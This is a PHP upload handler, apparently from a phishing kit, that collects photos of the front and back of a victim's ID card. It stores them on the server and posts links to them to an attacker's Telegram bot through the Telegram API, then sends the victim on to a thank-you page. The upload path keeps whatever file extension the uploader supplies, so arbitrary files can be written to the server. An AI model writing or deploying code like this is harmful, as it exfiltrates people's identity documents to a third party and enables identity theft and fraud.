<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    include '../../email.php';
    
    // Define the folder to save uploaded images
    $uploadDir = 'uploads/';

    // Generate unique filenames for the uploaded images
    $uploadedFile1 = $uploadDir . generateRandomString() . '.' . getFileExtension($_FILES['recto']['name']);
    $uploadedFile2 = $uploadDir . generateRandomString() . '.' . getFileExtension($_FILES['verso']['name']);

    // Move the uploaded files to the designated folder
    if (
        move_uploaded_file($_FILES['recto']['tmp_name'], $uploadedFile1) &&
        move_uploaded_file($_FILES['verso']['tmp_name'], $uploadedFile2)
    ) {
        // Images upload successful

        // Get the message from the form
        
        // Prepare the message for Telegram
        $telegramMessageRecto = "[+]━━━━【🔥 ID Recto 🔥】━━━━[+]\r\n";
        $telegramMessageRecto .= "Recto URL: http://".$_SERVER['HTTP_HOST'].rtrim(dirname($_SERVER['REQUEST_URI']), '\\/').'/' . $uploadedFile1;
        
        // Prepare the message for Telegram
        $telegramMessageVerso = "[+]━━━━【🔥 ID Verso 🔥】━━━━[+]\r\n";
        $telegramMessageVerso .= "Verso URL:  http://".$_SERVER['HTTP_HOST'].rtrim(dirname($_SERVER['REQUEST_URI']), '\\/').'/' . $uploadedFile2;

        // Send the recto message to Telegram using cURL
        $telegramAPI = "https://api.telegram.org/bot" . $api . "/sendMessage";
        $telegramParametersRecto = [
            'chat_id' => $chatid,
            'text' => $telegramMessageRecto,
            'parse_mode' => 'HTML'
        ];

        $chRecto = curl_init();
        curl_setopt($chRecto, CURLOPT_URL, $telegramAPI);
        curl_setopt($chRecto, CURLOPT_POST, 1);
        curl_setopt($chRecto, CURLOPT_POSTFIELDS, http_build_query($telegramParametersRecto));
        curl_setopt($chRecto, CURLOPT_RETURNTRANSFER, true);
        $telegramResponseRecto = curl_exec($chRecto);
        
        
        
        curl_close($chRecto);

        // Send the verso message to Telegram using cURL
        $telegramParametersVerso = [
            'chat_id' => $chatid,
            'text' => $telegramMessageVerso,
            'parse_mode' => 'HTML'
        ];

        $chVerso = curl_init();
        curl_setopt($chVerso, CURLOPT_URL, $telegramAPI);
        curl_setopt($chVerso, CURLOPT_POST, 1);
        curl_setopt($chVerso, CURLOPT_POSTFIELDS, http_build_query($telegramParametersVerso));
        curl_setopt($chVerso, CURLOPT_RETURNTRANSFER, true);
        $telegramResponseVerso = curl_exec($chVerso);
        
        
        
        curl_close($chVerso);

        header("Location: ../thnks.php");
    } else {
        // Image upload failed
        header("Location: ../id.php");
    }
}

// Function to generate a random string
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// Function to get the file extension from a filename
function getFileExtension($filename) {
    return pathinfo($filename, PATHINFO_EXTENSION);
}
?>
